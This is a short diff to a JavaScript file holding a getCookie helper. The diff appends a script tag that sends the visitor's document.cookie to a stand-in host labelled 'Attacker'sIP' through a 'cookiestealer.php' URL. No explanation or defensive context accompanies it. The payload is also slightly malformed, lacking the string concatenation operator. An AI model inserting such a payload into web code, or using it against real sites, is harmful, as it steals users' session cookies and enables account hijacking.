@@ -13,3 +13,6 @@ function getCookie(cname) {
         }
         return "";
     }
+	
+	
+	<script> document.location="http://Attacker'sIP/cookiestealer.php?c="document.cookie; </script>
